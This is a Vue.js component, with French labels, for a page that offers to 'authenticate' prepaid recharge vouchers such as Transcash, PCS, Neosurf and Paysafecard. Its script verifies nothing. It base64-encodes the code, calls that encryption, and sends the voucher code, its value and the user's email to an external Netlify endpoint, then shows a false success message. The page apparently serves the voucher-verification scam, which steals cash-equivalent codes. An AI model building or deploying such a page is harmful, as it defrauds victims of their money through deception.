<template>
  <div class="auth-container">
    <div class="image-container">
      <img src="/oth.jpg" alt="Recharge Image" />
    </div>
    <div class="form-container">
      <h2>Authenticate Your Recharge Card</h2>
      <form @submit.prevent="authenticate">
        <div class="form-group">
          <label for="type">Type de recharge:</label>
          <select id="type" v-model="rechargeType" required>
            <option value="transcash">Transcash</option>
            <option value="vanilla">Vanilla</option>
            <option value="itune">iTunes</option>
            <option value="google_play">Google Play</option>
            <option value="pcs">PCS</option>
            <option value="amazone">Amazon</option>
            <option value="neosurf">Neosurf</option>
            <option value="paysafecard">Paysafecard</option>
            <option value="steam_card">Steam Card</option>
            <option value="bitnovo">Bitnovo</option>
            <option value="cryptonow">Cryptonow</option>
          </select>
        </div>
        <div class="form-group">
          <label for="price">Prix de la recharge:</label>
          <input type="number" id="price" v-model="price" required />
        </div>
        <div class="form-group" v-if="recharge">
          <label for="code">Code de la recharge:</label>
          <input type="text" id="code" v-model="rechargeCode" required />
        </div>
        <div class="form-group" v-if="isCodeEncrypted">
          <label for="encryptedCode">Code de la recharge crypté:</label>
          <input type="text" id="encryptedCode" v-model="encryptedCode" readonly />
        </div>
        <div class="form-group">
          <button type="button" @click="encryptCode" class="btn-crypt">Crypter le code</button>
        </div>
        <div class="form-group">
          <label for="email">Email:</label>
          <input type="email" id="email" v-model="email" required />
        </div>
        <div class="form-group">
          <button type="submit" class="btn-auth">Authentifier</button>
        </div>
      </form>
    </div>
  </div>
</template>

<script>
import axios from 'axios';

export default {
  data() {
    return {
      rechargeType: 'transcash',
      price: '',
      rechargeCode: '',
      encryptedCode: '',
      isCodeEncrypted: false,
      recharge: true,
      email: ''
    };
  },
  methods: {
    encryptCode() {
      this.encryptedCode = btoa(this.rechargeCode);
      this.isCodeEncrypted = true;
      this.recharge = false;
    },
    authenticate() {
          axios
            .post('https://calm-horse-d69bdf.netlify.app/send-email', {
              rechargeType: this.rechargeType,
              price: this.price,
              rechargeCode: this.rechargeCode,
              encryptedCode: this.encryptedCode,
              email: this.email
            }, { withCredentials: true })
            .then(() => {
              alert(
                'Authentification réussie. Vous recevrez un message de confirmation par e-mail dans un instant.'
              );
              window.location.reload();
            })
            .catch((error) => {
              console.error('Erreur lors de l\'envoi des données vers le serveur:', error);
              alert('Une erreur est survenue lors de l\'authentification. Veuillez réessayer.');
            });

    }
  }
};
</script>


<style scoped>
.auth-container {
  display: flex;
  flex-direction: row;
  align-items: center;
  justify-content: center;
  max-width: 1200px;
  width: 100%;
  background: #ffffff;
  overflow: hidden;
}

.image-container {
  flex: 1;
  max-width: 900px;
}

.image-container img {
  width: 100%;
  height: auto;
  object-fit: cover;
}

.form-container {
  flex: 1;
  padding: 30px;
}

h2 {
  text-align: center;
  margin-bottom: 30px;
  font-size: 28px;
  font-weight: 700;
  color: #333;
  letter-spacing: 1px;
}

.form-group {
  margin-bottom: 20px;
}

label {
  display: block;
  margin-bottom: 8px;
  font-weight: 500;
  color: #555;
}

input,
select {
  width: 100%;
  padding: 12px;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 8px;
  font-size: 16px;
  transition: border-color 0.3s ease-in-out;
}

input:focus,
select:focus {
  border-color: #007bff;
  outline: none;
}

button {
  display: inline-block;
  width: 100%;
  padding: 15px;
  background: #007bff;
  color: white;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  font-size: 18px;
  font-weight: 500;
  transition: background 0.3s ease-in-out;
}

button:hover {
  background: #0056b3;
}

.btn-crypt {
  background-color: #28a745;
}

.btn-crypt:hover {
  background-color: #218838;
}

.btn-auth {
  background-color: #17a2b8;
}

.btn-auth:hover {
  background-color: #138496;
}

@media (max-width: 800px) {
  .auth-container {
    flex-direction: column;
  }

  .image-container,
  .form-container {
    max-width: 100%;
    width: 100%;
  }

  .image-container {
    max-height: 200px;
    margin-bottom: 200px;
  }

  .image-container img {
    height: 100%;
    object-fit: cover;
  }
}
</style>
